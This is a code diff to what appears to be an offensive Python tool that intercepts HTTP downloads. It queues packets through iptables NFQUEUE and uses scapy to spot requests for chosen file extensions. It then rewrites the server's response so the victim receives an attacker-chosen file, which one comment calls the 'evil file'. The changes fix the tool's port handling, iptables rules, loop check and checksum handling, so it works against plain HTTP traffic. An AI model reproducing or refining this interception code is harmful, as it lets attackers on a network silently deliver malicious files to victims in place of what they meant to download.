@@ -27,12 +27,11 @@ def root_check():
 
 def iptable_insert():
     try:
-        subprocess.run(['iptables', '-I', 'FORWARD', '-j', 'NFQUEUE', '--queue-num', '1337'], check=True)
-        '''
-        or
+        #subprocess.run(['iptables', '-I', 'FORWARD', '-j', 'NFQUEUE', '--queue-num', '1337'], check=True)
+        
         subprocess.run(['iptables', '-I', 'OUTPUT', '-j', 'NFQUEUE', '--queue-num', '1337'], check=True)
         subprocess.run(['iptables', '-I', 'INPUT', '-j', 'NFQUEUE', '--queue-num', '1337'], check=True)
-        '''
+
         print("[*] Iptables intercepting rule inserted")
     except Exception as e:
         print(f"[!] Error inserting iptables rule: {e}")
@@ -59,17 +58,18 @@ def process_packet(packet, extensions_to_replace, file_destination):
     scapy_packet = scapy.IP(packet.get_payload())
 
     # DEBUG LINE: Uncomment this to see if ANY traffic is hitting the script
-    print(f"Packet received: {scapy_packet.summary()}")
+    # print(f"Packet received: {scapy_packet.summary()}")
     
-    if scapy_packet.haslayer(scapy.Raw):
+    if scapy_packet.haslayer(scapy.Raw)and scapy_packet.haslayer(scapy.TCP):
         # OUTGOING REQUEST Check for file download
-        if scapy_packet[scapy.TCP].dport == 8080: #Traffic supposed to flow through bettercap so 8080 proxy
+        if scapy_packet[scapy.TCP].dport == 80: #Traffic supposed to flow through bettercap so 8080 proxy
             payload_content = scapy_packet[scapy.Raw].load
             
             for ext in extensions_to_replace:
                 if ext.encode() in payload_content:
-                    # Prevent looping by checking if we are requesting our own evil file
-                    if file_destination.encode() not in payload_content:
+                    check_filename = file_destination.split('/')[-1]
+                    # Prevent looping by checking if we are requesting our own file
+                    if check_filename.encode() not in payload_content:
                         print(f"[+] Target file ({ext}) download detected. Queuing redirect...")
                         ack_dict[scapy_packet[scapy.TCP].ack] = time.time()
                     else:
@@ -77,7 +77,7 @@ def process_packet(packet, extensions_to_replace, file_destination):
                     break # Stop checking other extensions
 
         # INCOMING RESPONSE (Replace the file)
-        elif scapy_packet[scapy.TCP].sport == 8080:
+        elif scapy_packet[scapy.TCP].sport == 80:
             current_seq = scapy_packet[scapy.TCP].seq
 
             if current_seq in ack_dict:
@@ -97,7 +97,6 @@ def process_packet(packet, extensions_to_replace, file_destination):
                 # Remove checksums so Scapy recalculates them
                 del scapy_packet[scapy.IP].len
                 del scapy_packet[scapy.IP].chksum
-                del scapy_packet[scapy.TCP].len
                 del scapy_packet[scapy.TCP].chksum
                 # Set the modified payload back to the netfilter packet
                 packet.set_payload(bytes(scapy_packet))
